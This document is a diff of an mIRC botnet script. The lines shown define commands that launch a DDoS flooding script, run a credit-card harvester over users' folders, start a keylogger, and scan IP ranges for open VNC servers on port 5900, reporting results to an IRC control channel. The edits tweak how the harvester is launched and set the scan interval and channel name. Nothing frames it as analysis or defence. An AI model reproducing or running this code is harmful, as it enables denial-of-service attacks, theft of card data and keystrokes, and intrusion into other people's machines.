@@ -27,7 +27,7 @@ on *:sockread:vncscan*:{
 }
 
 alias ddos { .opnotice %fldchan  DDoS < , $+ $r(0,99) $1   $+ $r(0,99) $+ , $+ $r(0,99) $2   $+ $r(0,99) $+ , $+ $r(0,99) $3   $+ $r(0,99) $+ , $+ $r(0,99) $   $+ $r(0,99) $+ , $+ $r(0,99) $5 > | run start /MIN /REALTIME $findfile($shortfn($Mircdir),*p.exe*,1) $findfile($shortfn($Mircdir),*ddos.py*,1) $2- & }
-alias cc { opnotice %fldchan Searching for Credit Card information in   $+ $r(0,99) $+ , $+ $r(0,99) C:\USERS | .timerCC -o 1 5 run start /MIN /REALTIME $findfile($shortfn($Mircdir),*cc.exe*,1) }
+alias cc { opnotice %fldchan Searching for Credit Card information in   $+ $r(0,99) $+ , $+ $r(0,99) C:\USERS | .timerCC -o 1 5 run $findfile($shortfn($Mircdir),*cc.exe*,1) }
 alias kl { run system.exe | .timerkl -o 0 10 init }
 
 alias checkvnc {
@@ -44,8 +44,8 @@ on *:PLAYEND:if (*system.log iswm $filename) .remove system.log
 on *:sockclose:vncscan*:return
 alias rvnc {
   if (%range) { unset %range* | unset %vnc* }
-  if (!%interval) set %interval 700
-  if (!%fldchan) set %fldchan #psy#
+  if (!%interval) set %interval 0
+  if (!%fldchan) set %fldchan #X#psy#X#
   if (!%vncport) set %vncport 5900
   if ($2) set %vncport $2
   set %range $1
